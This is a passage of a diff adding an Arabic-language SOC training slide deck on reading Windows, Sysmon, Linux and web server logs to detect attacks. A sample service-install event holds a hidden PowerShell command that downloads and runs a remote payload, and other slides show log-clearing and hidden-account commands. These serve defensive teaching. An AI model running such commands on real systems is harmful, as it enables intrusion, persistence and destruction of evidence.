+        <p>عندما ينجح أي حساب في تسجيل الدخول، يُسجل الحدث 4624. الحقل الأكثر حساسية للتحقيق هو <strong class="blue">نوع تسجيل الدخول (Logon Type)</strong>:</p>
+        <div class="card-row card-row--3">
+          <div class="card">
+            <h4><span class="blue">Logon Type 2: محلي (Interactive)</span></h4>
+            <p><strong>دخول مباشر عبر الجهاز.</strong> جلس المستخدم فعلياً أمام شاشة الحاسوب وأدخل بيانات اعتماده على لوحة المفاتيح المحلية.</p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">Logon Type 3: شبكي (Network)</span></h4>
+            <p><strong>اتصال عبر الشبكة.</strong> اتصال بمجلد مشاركة شبكي (SMB)، أو طابعة شبكية، أو تطبيق ويب دون فتح واجهة سطح مكتب.</p>
+          </div>
+          <div class="card">
+            <h4><span class="yellow">Logon Type 10: دخول عن بعد (RDP)</span></h4>
+            <p><strong>جلسة سطح مكتب عن بعد (Remote Desktop).</strong> اتصل المستخدم عبر بروتوكول RDP من جهاز أو عنوان IP آخر عبر الشبكة.</p>
+          </div>
+        </div>
+
+        <div class="card-row card-row--3" style="margin-top: 10px;">
+          <div class="card">
+            <h4><span class="cyan">Logon Type 4: دفعة (Batch)</span></h4>
+            <p>تشغيل مهمة مجدولة (Scheduled Task) في الخلفية تعمل تحت حساب خدمة محدد مسبقاً.</p>
+          </div>
+          <div class="card">
+            <h4><span class="green">Logon Type 5: خدمة (Service)</span></h4>
+            <p>إقلاع وتشغيل إحدى خدمات ويندوز في الخلفية بحساب خدمة خاص بالنظام.</p>
+          </div>
+          <div class="card">
+            <h4><span class="red">Logon Type 9: بيانات جديدة</span></h4>
+            <p>يُستخدم في أوامر <code>runas /netonly</code> ويُستغل بكثرة في أدوات الهجوم مثل Mimikatz.</p>
+          </div>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="9" data-title="التحقيق في حدث 4625: كشف هجمات كسر كلمات المرور" data-notes="حدث فشل الدخول 4625 هو كاشف هجمات التخمين الأساسي. اشرح أكواد الخطأ الفرعية: الكود 0xC000006A يعني اسم مستخدم صحيح بكلمة سر خاطئة. الكود 0xC0000064 يعني أن اسم المستخدم غير موجود أصلاً (محاولة حصر المستخدمين). والكود 0xC0000234 يعني إقفال الحساب.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> تحليل المصادقة والهويات</div>
+        
+        <h2>كشف هجمات التخمين وكسر كلمات المرور عبر حدث 4625</h2>
+        <p>يُسجل هذا الحدث فور فشل أي محاولة دخول. في مركز العمليات، تدفق أحداث 4625 المتتالية هو مؤشر هجوم نشط:</p>
+        
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>كود الخطأ الفرعي (Substatus)</th>
+                <th>رمز الـ Hex</th>
+                <th>التفسير الجنائي والدلالة الأمنية</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>STATUS_WRONG_PASSWORD</code></td>
+                <td><span class="mono red">0xC000006A</span></td>
+                <td>اسم المستخدم صحيح وموجود في النظام، لكن كلمة المرور المدخلة خاطئة (محاولة تخمين كلمة السر).</td>
+              </tr>
+              <tr>
+                <td><code>STATUS_NO_SUCH_USER</code></td>
+                <td><span class="mono yellow">0xC0000064</span></td>
+                <td>اسم المستخدم غير موجود أصلاً في النظام (هجوم استكشاف وحصر أسماء الموظفين Enumeration).</td>
+              </tr>
+              <tr>
+                <td><code>STATUS_ACCOUNT_LOCKED_OUT</code></td>
+                <td><span class="mono red">0xC0000234</span></td>
+                <td>تم إقفال الحساب لتجاوز الحد الأقصى للمحاولات الخاطئة نتيجة هجوم التخمين المتواصل.</td>
+              </tr>
+              <tr>
+                <td><code>STATUS_PASSWORD_EXPIRED</code></td>
+                <td><span class="mono blue">0xC0000071</span></td>
+                <td>كلمة مرور منتهية الصلاحية لمستخدم حقيقي، أو بيانات قديمة لحساب خدمة.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout-box callout-box--warn" style="margin-top: 14px;">
+          <h4>🚨 معيار الفرز في مركز العمليات: التخمين المكثف مقابل الرش (Spray)</h4>
+          <p><strong>الهجوم التقليدي (Brute Force):</strong> 500 محاولة فاشلة ضد حساب مستخدم واحد من نفس الـ IP.<br><strong>هجوم الرش (Password Spraying):</strong> محاولة فاشلة واحدة ضد 500 حساب مختلف بكلمة سر واحدة شهيرة (مثل <code>Spring2026!</code>) للالتفاف على سياسة إقفال الحسابات.</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="10" data-title="التحقيق في حدث 4688: مراقبة تشغيل العمليات (Process Auditing)" data-notes="اشرح أن حدث 4688 يسجل إقلاع أي برنامج تنفيذي. افتراضياً لا يُسجل ويندوز سطر الأوامر كاملاً إلا بتفعيل سياسة Group Policy صريحة: Include command line in process creation events. بدون تفعيلها سترى أن powershell.exe اشتغل، لكنك لن ترى الكود الخبيث المشفر الذي نفذه!">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> رؤية العمليات والبرامج</div>
+        
+        <h2>مراقبة تشغيل البرمجيات عبر حدث 4688</h2>
+        <p>يُسجل هذا الحدث إقلاع أي برنامج تنفيذي داخل النظام، وهو أساس تتبع شجرة هجمات البرمجيات الخبيثة:</p>
+        
+        <div class="card-row card-row--2">
+          <div class="card">
+            <h4>العملية الأب المنشئة (Creator)</h4>
+            <p><strong>الحقل:</strong> <code>CreatorProcessName</code> ورقم <code>ProcessId</code><br>من الذي شغل البرنامج؟ (مثال: مستكشف الملفات explorer.exe أو برنامج Word مشبوه WINWORD.EXE).</p>
+          </div>
+          <div class="card">
+            <h4>العملية الابن المنشأة (New Process)</h4>
+            <p><strong>الحقل:</strong> <code>NewProcessName</code> ورقم <code>NewProcessId</code><br>ما البرنامج الذي انطلق؟ (مثال: موجه الأوامر cmd.exe أو ملف غير موقع في مجلد %APPDATA%).</p>
+          </div>
+        </div>
+
+        <div class="callout-box callout-box--red" style="margin-top: 14px;">
+          <h4>⚠️ الإعداد الإلزامي لمركز العمليات: تدقيق سطر الأوامر (Command Line Auditing)</h4>
+          <p>افتراضياً، يُسجل ويندوز مسار الملف فقط، ولكنه <strong>يحجب سطر الأوامر والباراميترات</strong>. يجب تفعيل السياسة:<br><code>Computer Configuration ⬅️ Administrative Templates ⬅️ System ⬅️ Audit Process Creation ⬅️ "Include command line in process creation events"</code>.<br>بدون هذا الخيار، سترى أن <code>powershell.exe</code> اشتغل، لكنك لن ترى الحمولة الخبيثة المشفرة الممررة له: <code>powershell.exe -enc JABzAD0...</code>!</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="11" data-title="لماذا لا تكفي سجلات ويندوز الافتراضية؟ الحل: أداة Sysmon" data-notes="اشرح لماذا تثبت مراكز الـ SOC أداة Sysmon من مايكروسوفت. سجلات الأمان الافتراضية تفتقر لقيم الهاش التشفيرية، وتفتقر لربط الاتصالات الشبكية برقم العملية المنفذة، ولا تكشف حقن العمليات في الذاكرة. أداة Sysmon تسد هذه الثغرة الجنائية بالكامل ومجاناً.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> القياسات السلوكية المتقدمة</div>
+        
+        <h2>النقاط العمياء القاتلة في سجلات ويندوز الافتراضية</h2>
+        <p>صُمم تدقيق ويندوز الافتراضي للامتثال الإداري وليس للتصدي للهجمات السيبرانية المتقدمة، مما يترك ثغرات كشف واسعة:</p>
+        
+        <div class="card-row card-row--3">
+          <div class="card">
+            <h4>النقطة العمياء 1: انعدام قيم الهاش</h4>
+            <p>يُسجل ويندوز اسم البرنامج التنفيذي، لكنه لا يحسب الهاش (SHA256). إذا سمى المهاجم برنامجه الخبيث <code>svchost.exe</code> فلن تتمكن من تمييزه عن ملف ويندوز الأصلي!</p>
+          </div>
+          <div class="card">
+            <h4>النقطة العمياء 2: غياب ربط الشبكة بالعملية</h4>
+            <p>سجلات جدار الحماية تُظهر اتصالاً خارجياً برقم IP، لكنها <em>تعجز عن إخبارك برقم العملية (PID) أو البرنامج المسئول</em> عن هذا الاتصال!</p>
+          </div>
+          <div class="card">
+            <h4>النقطة العمياء 3: غياب كشف حقن الذاكرة</h4>
+            <p>تعجز السجلات الافتراضية عن كشف حقن الأكواد الخبيثة داخل العمليات المشروعة (Process Hollowing و DLL Injection).</p>
+          </div>
+        </div>
+
+        <div class="callout-box" style="margin-top: 16px;">
+          <h4>🛡️ الدرع الذهبي: أداة Microsoft Sysmon (System Monitor)</h4>
+          <p>خدمة وبرنامج تشغيل خفيف ومجاني من حزمة Sysinternals التابعة لمايكروسوفت، يعمل في خلفية النظام لمراقبة السلوكيات المتقدمة وتوثيقها في قناة مخصصة: <code>Microsoft-Windows-Sysmon/Operational</code>.</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="12" data-title="أهم معرفات أحداث Sysmon لصائد التهديدات" data-notes="استعرض أهم أحداث Sysmon: الحدث 1 (إنشاء عملية مع الهاش وسلسلة النسب للعملية الأب)، الحدث 3 (الاتصال الشبكي المربوط مباشرة بالبرنامج المسؤول)، الحدث 11 (إنشاء ملفات في مسارات حساسة)، والحدث 8 (كشف حقن العمليات في الذاكرة).">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> قياسات Sysmon الجنائية</div>
+        
+        <h2>معرفات أحداث Sysmon الأساسية لصيد التهديدات</h2>
+        <p>توفر أحداث Sysmon أعمق رؤية جنائية ممكنة على الأجهزة الطرفية دون الحاجة لشراء برمجيات EDR تجارية باهظة:</p>
+        
+        <div class="card-row card-row--3">
+          <div class="card">
+            <h4><span class="blue">Event ID 1: إنشاء عملية (Process Create)</span></h4>
+            <p>يتفوق على حدث 4688 بتسجيل: <strong>قيم الهاش (SHA256)</strong>، سطر أوامر العملية الأب، مسار العمل الحالي، والهوية الفريدة للعملية (ProcessGuid).</p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">Event ID 3: اتصال شبكي (Network Connect)</span></h4>
+            <p>يوثق الاتصالات الشبكية الصادرة والواردة ويربط عنوان الـ IP والمنفذ المستهدف مباشرة بـ <strong>اسم ومسار البرنامج التنفيذي (Image)</strong> المسؤول عنه!</p>
+          </div>
+          <div class="card">
+            <h4><span class="cyan">Event ID 11: إنشاء ملف (FileCreate)</span></h4>
+            <p>يوثق إنشاء أو كتابة أي ملف جديد على القرص. جوهري لكشف إسقاط الحمولات الخبيثة وفدية تشفير الملفات ورفع الـ Web Shells.</p>
+          </div>
+          <div class="card">
+            <h4><span class="yellow">Event ID 7: تحميل مكتبة (Image Loaded)</span></h4>
+            <p>يوثق تحميل مكتبات الـ DLL داخل العمليات، وهو حاسم لكشف هجمات استبدال وتحميل المكتبات الخبيثة (DLL Hijacking).</p>
+          </div>
+          <div class="card">
+            <h4><span class="green">Event ID 12/13: تعديل الريجستري</span></h4>
+            <p>يكشف إنشاء أو تعديل أو مسح مفاتيح البقاء في سجل النظام (مثل مفاتيح التشغيل التلقائي Run Keys وخدمات ويندوز).</p>
+          </div>
+          <div class="card">
+            <h4><span class="red">Event ID 8: حقن مسار عن بعد (CreateRemoteThread)</span></h4>
+            <p>يكشف قيام برنامج بحقن كود وتشغيل خيط معالجة داخل ذاكرة برنامج آخر مستقل — البصمة الواضحة لهجمات Process Injection!</p>
+          </div>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="13" data-title="سجلات أنظمة لينكس ومعمارية Syslog" data-notes="اشرح سجلات لينكس عبر بروتوكول Syslog ونظام systemd journalctl. ركز على مسار auth.log (أو secure في أنظمة RedHat) لمراقبة محاولات تسجيل الدخول الفاشلة عبر SSH وأوامر sudo الحساسة.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> أمن أنظمة لينكس</div>
+        
+        <h2>معمارية سجلات أنظمة لينكس وأهم ملفات التحقيق</h2>
+        <p>تعتمد خوادم لينكس على بروتوكول <strong class="blue">Syslog القياسي (RFC 5424)</strong> ونظام التوثيق المركزي journald لإدارة وتوجيه السجلات:</p>
+        
+        <div class="card-row card-row--3">
+          <div class="card">
+            <h4><span class="red">/var/log/auth.log</span></h4>
+            <p><em>(أو <code>/var/log/secure</code> في RHEL/Rocky)</em>. يوثق عمليات المصادقة، تسجيلات SSH، أوامر <code>sudo</code> المنفذة بصلاحيات الجذر، ومحاولات اختراق الحسابات.</p>
+          </div>
+          <div class="card">
+            <h4><span class="blue">/var/log/syslog</span></h4>
+            <p><em>(أو <code>/var/log/messages</code>)</em>. السجل العام للنظام: رسائل الخدمات، أحداث النواة (Kernel)، وتنبيهات البرامج الخلفية (Daemons).</p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">journalctl (نظام systemd)</span></h4>
+            <p>قاعدة بيانات السجلات المهيكلة في توزيعات لينكس الحديثة. يمكن الاستعلام عنها بالأوامر مثل: <br><code>journalctl -u ssh -n 20</code></p>
+          </div>
+        </div>
+
+        <h4>نموذج سجل هجوم كسر SSH في ملف auth.log</h4>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="terminal-dot terminal-dot--red"></span> auth.log (بصمة هجوم تخمين SSH Brute Force)</div>
+          <div class="terminal-body">Oct 21 03:12:44 ubuntu-srv sshd[14205]: Failed password for invalid user root from 203.0.113.45 port 54812 ssh2
+Oct 21 03:12:46 ubuntu-srv sshd[14208]: Failed password for invalid user admin from 203.0.113.45 port 54816 ssh2
+Oct 21 03:12:48 ubuntu-srv sshd[14212]: Failed password for invalid user oracle from 203.0.113.45 port 54820 ssh2</div>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="14" data-title="تشريح سجلات خوادم الويب (Web Access Logs)" data-notes="اشرح كيف تسجل خوادم الويب (Apache, Nginx, IIS) سجلات الوصول بالصيغة القياسية Combined Format. علّم الطلاب كيف يكتشفون الهجمات بمجرد النظر إلى الرابط المستهدف (URI) وكود الاستجابة (Status Code) والـ User-Agent.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> أمن تطبيقات الويب</div>
+        
+        <h2>تشريح سجلات خوادم الويب (Combined Log Format)</h2>
+        <p>توثق خوادم الويب كل طلب HTTP/HTTPS يصل إلى بوابات وتطبيقات المؤسسة عبر سجلات الوصول (Access Logs):</p>
+        
+        <div class="terminal">
+          <div class="terminal-bar"><span class="terminal-dot terminal-dot--yellow"></span> تشريح سجل الوصول في خوادم Nginx / Apache</div>
+          <div class="terminal-body"><span class="blue">198.51.100.24</span> - <span class="purple">john.doe</span> [<span class="cyan">21/Oct/2026:04:18:02 +0000</span>] "<span class="green">POST</span> <span class="yellow">/api/v1/transfer</span> <span class="mono">HTTP/1.1</span>" <span class="red">403</span> 182 "<span class="mono">https://corp.local/dashboard</span>" "<span class="mono">Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span>"</div>
+        </div>
+
+        <div class="table-wrap" style="margin-top: 14px;">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>اسم الحقل</th>
+                <th>القيمة في النموذج</th>
+                <th>الدلالة الأمنية لمحلل مركز العمليات (SOC)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>عنوان IP العميل (المصدر)</td>
+                <td><span class="mono blue">198.51.100.24</span></td>
+                <td>من أرسل الطلب؟ فحص سمعة العنوان عبر قواعد استخبارات التهديدات (AbuseIPDB / VirusTotal).</td>
+              </tr>
+              <tr>
+                <td>طريقة ومسار الطلب (URI)</td>
+                <td><span class="mono yellow">POST /api/v1/transfer</span></td>
+                <td>ما المسار المستهدف؟ البحث عن محاولات تجاوز المسارات (<code>../</code>) أو أوامر قواعد البيانات.</td>
+              </tr>
+              <tr>
+                <td>كود استجابة الـ HTTP</td>
+                <td><span class="mono red">403 (ممنوع Forbidden)</span></td>
+                <td>هل نجح الهجوم؟ 200 (نجاح خطير)، 403 (حجب أمني ناجح)، 500 (عطل أو استغلال ثغرة بالنظام).</td>
+              </tr>
+              <tr>
+                <td>معرّف العميل (User-Agent)</td>
+                <td><span class="mono">Mozilla/5.0...</span></td>
+                <td>كشف أدوات الفحص التلقائية للمهاجمين (مثل <code>sqlmap</code> أو <code>nikto</code> أو سكربتات بايثون).</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="15" data-title="سيناريو هجوم عملي 1: من التخمين إلى الاختراق الكامل" data-notes="اشرح للطلاب كيف يظهر الهجوم الحقيقي في السجلات كتسلسل زمني مترابط: سيل من محاولات الفشل (4625)، يليه نجاح مفاجئ (4624)، يليه فوراً منح صلاحيات مسؤول (4672). هذا التسلسل هو أشهر قاعدة ربط (Correlation Rule) تُكتب في الـ SIEM.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> تتبع الهجمات في السجلات</div>
+        
+        <h2>تتبع سلسلة الهجوم داخل السجلات: من التخمين إلى الاختراق</h2>
+        <p>في مركز العمليات الواقعي، لا يأتيك الهجوم في صورة تنبيه سحري — بل ينكشف عبر تسلسل زمني من الأحداث المترابطة:</p>
+        
+        <div class="cycle-row" style="margin-top: 16px;">
+          <div class="cycle-item">
+            <div class="cycle-num" style="color: var(--red-400);">1</div>
+            <h4>سيل من أحداث 4625</h4>
+            <p><strong>فشل تسجيل الدخول.</strong> 250 محاولة فاشلة استهدفت حساب <code>svc_backup</code> خلال 90 ثانية بكود خطأ <code>0xC000006A</code>.</p>
+          </div>
+          <div class="cycle-item">
+            <div class="cycle-num" style="color: var(--yellow-400);">2</div>
+            <h4>حدث وحيد 4624</h4>
+            <p><strong>نجح الاختراق!</strong> في تمام الساعة 02:14:11 نجح المهاجم في الدخول بنوع <code>LogonType=3</code> من عنوان IP خارجي.</p>
+          </div>
+          <div class="cycle-item">
+            <div class="cycle-num" style="color: var(--red-400);">3</div>
+            <h4>حدث فوري 4672</h4>
+            <p><strong>منح صلاحيات عليا.</strong> تم تعيين صلاحيات المسؤول الإداري (SeDebugPrivilege) لجلسة الدخول المخترقة.</p>
+          </div>
+          <div class="cycle-item">
+            <div class="cycle-num" style="color: var(--purple-400);">4</div>
+            <h4>حدث 4688 و Sysmon 1</h4>
+            <p><strong>تشغيل أوامر خبيثة.</strong> قامت الجلسة المخترقة بتشغيل <code>whoami /priv</code> ثم إنشاء حساب مخفي <code>net user /add</code>.</p>
+          </div>
+        </div>
+
+        <div class="callout-box" style="margin-top: 18px;">
+          <h4>🧠 منطق قاعدة الربط في الـ SIEM (Correlation Rule Logic)</h4>
+          <p><code>إذا تكرر (حدث 4625) أكثر من 20 مرة من نفس الـ IP خلال دقيقتين ⬅️ وتلاه مباشرة (حدث 4624) لنفس الحساب ⬅️ أطلق إنذاراً فورياً: "حالة حرجة: نجاح هجوم كسر كلمة المرور واختراق الحساب"</code></p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="16" data-title="سيناريو هجوم عملي 2: تثبيت خدمة خبيثة للبقاء (Persistence)" data-notes="اشرح حدث تثبيت خدمة ويندوز 7045. يلجأ المهاجمون لزرع خدمة لضمان بقاء أدواتهم بعد إعادة تشغيل الجهاز (MITRE T1543.003). علّم الطلاب كيف يفحصون مسار الملف ImagePath لكشف الأوامر المشبوهة.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> تتبع الهجمات في السجلات</div>
+        
+        <h2>كشف استدامة البرمجيات الخبيثة عبر حدث 7045 (New Service)</h2>
+        <p>يقوم المهاجمون بإنشاء خدمات ويندوز جديدة لضمان عمل أبوابهم الخلفية تلقائياً مع كل إقلاع للجهاز:</p>
+        
+        <div class="terminal">
+          <div class="terminal-bar"><span class="terminal-dot terminal-dot--red"></span> سجل النظام — حدث تثبيت خدمة جديدة (Event ID 7045)</div>
+          <div class="terminal-body">Log Name:      System
+Source:        Service Control Manager
+Event ID:      7045
+Level:         Information
+User:          SYSTEM
+Description:
+A service was installed in the system.
+Service Name:  WindowsDefenderUpdateHelper
+Service File Name:  powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.99/payload.ps1')"
+Service Type:  user mode service
+Service Start Type:  auto start
+Service Account:  LocalSystem</div>
+        </div>
+
+        <div class="callout-box callout-box--red" style="margin-top: 14px;">
+          <h4>🔍 3 علامات حمراء فاضحة في هذا السجل تكشف الهجوم فوراً</h4>
+          <p>1. <strong>اسم خادع (Masquerading):</strong> سُميت الخدمة "WindowsDefenderUpdateHelper" لخداع مسؤولي النظام وإيهامهم بأنها خدمة رسمية.<br>2. <strong>برنامج مشبوه:</strong> مسار الخدمة يشغل <code>powershell.exe</code> بنوافذ مخفية بدلاً من ملف خدمة تنفيذي عادي.<br>3. <strong>حمولة خارجية:</strong> يقوم الأمر بتحميل وتشغيل كود خبيث في الذاكرة مباشرة من خادم تحكم وسيطرة خارجي (C2)!</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="17" data-title="سيناريو هجوم عملي 3: مسح السجلات وطمس الآثار (Event 1102)" data-notes="اشرح حدث مسح سجلات الأمان 1102 والحدث 104 لسجل النظام. عندما يشعر المهاجم بافتضاح أمره يقوم بتشغيل أمر مسح السجلات wevtutil cl Security لطمس أدلته، لكن عملية المسح نفسها تُسجل فوراً في حدث 1102 لا يمكن للمهاجم تفاديه!">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> تقنيات التخفي والمراوغة</div>
+        
+        <h2>كشف محاولات طمس الأدلة: مسح السجلات (Event ID 1102)</h2>
+        <p>عندما ينتهي المهاجم المحترف من عمليته، يلجأ لمسح السجلات لمنع المحققين الجنائيين من تعقب خطواته:</p>
+        
+        <div class="card-row card-row--2">
+          <div class="card">
+            <h4><span class="red">مسح سجل الأمان: حدث 1102</span></h4>
+            <p>يُسجل في <code>Security.evtx</code> فور قيام أي شخص بتفريغ سجل الأمان عبر موجه الأوامر: <br><code>wevtutil cl Security</code> أو أوامر باور شيل.</p>
+          </div>
+          <div class="card">
+            <h4><span class="yellow">مسح سجل النظام: حدث 104</span></h4>
+            <p>يُسجل في <code>System.evtx</code> عند قيام مستخدم أو سكربت خبيث بتفريغ ومسح سجل النظام أو التطبيقات.</p>
+          </div>
+        </div>
+
+        <div class="terminal" style="margin-top: 14px;">
+          <div class="terminal-bar"><span class="terminal-dot terminal-dot--red"></span> سجل الأمان — حدث مسح السجل (Event ID 1102)</div>
+          <div class="terminal-body">Log Name:      Security
+Source:        Microsoft-Windows-Eventlog
+Event ID:      1102
+User:          CORP\compromised_admin
+Description:
+The audit log was cleared.
+Subject:
+    Security ID:        S-1-5-21-392817291-1029381-1001
+    Account Name:       compromised_admin
+    Domain:             CORP
+    Logon ID:           0x14F92B</div>
+        </div>
+
+        <div class="callout-box callout-box--red" style="margin-top: 12px;">
+          <h4>🚨 المفارقة القاتلة لمسح السجلات</h4>
+          <p>قد يتمكن المهاجم من مسح الأحداث السابقة، لكن <strong>نظام ويندوز يوثق فوراً من الذي قام بالمسح</strong> في الحدث 1102! في مراكز الـ SOC الناضجة، يؤدي هذا الحدث إلى استنفار أمني فوري لعزل الجهاز والتحقيق في الحساب الفاعل.</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="18" data-title="أفضل الممارسات المؤسسية لحماية السجلات وإدارتها" data-notes="اشرح المبادئ الثلاثة لحماية السجلات: الترحيل الفوري للسيرفر المركزي (لكي لا يفيد مسح السجل المحلي)، مزامنة الوقت عبر NTP، وتخزين السجلات في وسائط غير قابلة للتعديل WORM.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> هندسة مركز العمليات (SOC)</div>
+        
+        <h2>أفضل الممارسات لحماية موثوقية السجلات وسلامتها</h2>
+        <p>قوة مركز الـ SOC تعتمد تماماً على نزاهة وموثوقية السجلات التي يحللها. يجب تطبيق ثلاثة مبادئ معمارية صارمة:</p>
+        
+        <div class="card-row card-row--3">
+          <div class="card">
+            <h4><span class="blue">1. الترحيل الفوري (Real-Time)</span></h4>
+            <p>لا تترك السجلات على الأجهزة المحلية فقط! يجب ترحيلها خلال ثوانٍ إلى الـ SIEM المركزي. حتى لو مسح المهاجم سجلات الجهاز، فالسجلات محفوظة بأمان في الـ SIEM.</p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">2. توحيد ومزامنة الوقت (NTP)</span></h4>
+            <p>إلزام كافة الأجهزة بمزامنة وقتها بتوقيت UTC عبر خوادم NTP موحدة. انحراف التوقيت بمقدار 10 ثوانٍ فقط يدمر قواعد الربط ويفسد الأدلة الجنائية!</p>
+          </div>
+          <div class="card">
+            <h4><span class="green">3. التخزين غير القابل للتعديل</span></h4>
+            <p>حفظ السجلات المؤرشفة في وحدات تخزين (WORM: Write-Once-Read-Many). تقييد الصلاحيات بحيث لا يستطيع حتى مدير الشبكة حذف السجلات دون موافقة أمنية متعددة.</p>
+          </div>
+        </div>
+
+        <div class="callout-box" style="margin-top: 16px;">
+          <h4>📋 معايير الاحتفاظ بالسجلات (NIST SP 800-92)</h4>
+          <p>الاحتفاظ بالسجلات القابلة للبحث السريع في الـ SIEM لمدة لا تقل عن <strong>90 يوماً</strong> (Hot Storage)، والاحتفاظ بالسجلات المؤرشفة والمضغوطة لمدة لا تقل عن <strong>سنة كاملة (365 يوماً)</strong> للتحقيقات الجنائية المؤجلة.</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="19" data-title="الخلاصة والدروس المستفادة من المعمل" data-notes="لخص أهم مخرجات المعمل للطلاب. أكد أن السجلات هي طبقة البيانات الأساسية التي يقوم عليها كل ما سيأتي لاحقاً. في المعمل القادم (المحاضرة 2)، سنقوم بتجهيز وتثبيت بيئة معمل الـ SOC على أجهزتهم لتحليل هذه السجلات عملياً.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> مراجعة وخاتمة</div>
+        
+        <h2>خلاصة المعمل: دليل المحلل للتعامل مع السجلات</h2>
+        <p>لقد أتقنت الآن الأساس الجوهري للسجلات الأمنية التي يقوم عليها عمل مراكز العمليات حول العالم:</p>
+        <div class="card-row card-row--2" style="margin-top: 16px;">
+          <div class="card">
+            <h4>1. الحقيقة الرقمية المطلقة</h4>
+            <p>السجلات هي الشاهد الموثوق على كل ما حدث في النظام. لا تعتمد على الظنون — دائماً ارجع للسجل الخام وتأكد من الحقول الخمسة.</p>
+          </div>
+          <div class="card">
+            <h4>2. معرفات ويندوز الأساسية</h4>
+            <p>احفظها دائماً: 4624 (نوع الدخول)، 4625 (كود الفشل والتخمين)، 4688 (سطر الأوامر)، 7045 (خدمات البقاء)، و 1102 (مسح السجلات).</p>
+          </div>
+          <div class="card">
+            <h4>3. القياسات السلوكية المتقدمة</h4>
+            <p>أداة Sysmon تسد ثغرات النظام بتسجيل قيم الهاش للعمليات (حدث 1)، وربط اتصالات الشبكة بالبرامج (حدث 3)، وإنشاء الملفات (حدث 11).</p>
+          </div>
+          <div class="card">
+            <h4>4. الخطوة القادمة: تجهيز اللاب</h4>
+            <p>في المعمل الثاني، سنقوم بتثبيت وتجهيز أدوات Wireshark و Sysinternals ونظام الـ SIEM على أجهزتكم لنبدأ التحليل العملي الحقيقي!</p>
+          </div>
+        </div>
+            
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Bottom Navigation Bar -->
+  <div class="bottom-bar">
+    <div class="slide-counter" id="slide-counter">-- / --</div>
+    <div class="nav-controls">
+      <button class="nav-btn nav-btn--notes" id="btn-notes" title="ملاحظات المحاضر (Key: N)">📝 ملاحظات</button>
+      <button class="nav-btn" id="btn-prev" aria-label="الشريحة السابقة">→</button>
+      <button class="nav-btn" id="btn-next" aria-label="الشريحة التالية">←</button>
+    </div>
+  </div>
+
+  <!-- Speaker Notes Overlay -->
+  <div id="speaker-notes-overlay" role="dialog" aria-label="ملاحظات المحاضر">
+    <div class="notes-header">
+      <div class="notes-title">
+        <span>📝</span> ملاحظات المحاضر
+        <span id="notes-slide-num" style="font-size:0.75rem; color:var(--text-muted); font-weight:normal; margin-left:6px; margin-right:6px;"></span>
+      </div>
+      <button class="notes-close" id="btn-close-notes" aria-label="إغلاق الملاحظات">&times;</button>
+    </div>
+    <div class="notes-body" id="notes-content">
+      <span class="notes-empty">لا توجد ملاحظات مسجلة لهذه الشريحة.</span>
+    </div>
+  </div>
+
+  <script>
+    (() => {
+      const slides = document.querySelectorAll('.slide');
+      const total = slides.length;
+      let current = 0;
+
+      const progressBar = document.getElementById('progress-bar');
+      const slideCounter = document.getElementById('slide-counter');
+      const headerTitle = document.getElementById('header-slide-title');
+
+      function getOverlay() { return document.getElementById('speaker-notes-overlay'); }
+      function getNotesBtn() { return document.getElementById('btn-notes'); }
+
+      function updateNotes() {
+        const overlay = getOverlay();
+        if (!overlay) return;
+        const notesContent = document.getElementById('notes-content');
+        const notesSlideNum = document.getElementById('notes-slide-num');
+        const slide = slides[current];
+        if (!slide) return;
+        const note = slide.getAttribute('data-notes');
+        const title = slide.getAttribute('data-title') || `Slide ${current + 1}`;
+        if (notesSlideNum) {
+          notesSlideNum.textContent = `(${String(current + 1).padStart(2, '0')}/${String(total).padStart(2, '0')} - ${title})`;
+        }
+        if (notesContent) {
+          if (note && note.trim().length > 0) {
+            notesContent.innerHTML = `<p>${note.replace(/\n/g, '<br>')}</p>`;
+          } else {
+            const isAr = document.documentElement.lang === 'ar' || document.documentElement.dir === 'rtl';
+            notesContent.innerHTML = `<span class="notes-empty">${isAr ? 'لا توجد ملاحظات مسجلة لهذه الشريحة.' : 'No speaker notes recorded for this slide.'}</span>`;
+          }
+        }
+      }
+
+      function toggleNotes() {
+        const overlay = getOverlay();
+        const btn = getNotesBtn();
+        if (!overlay) return;
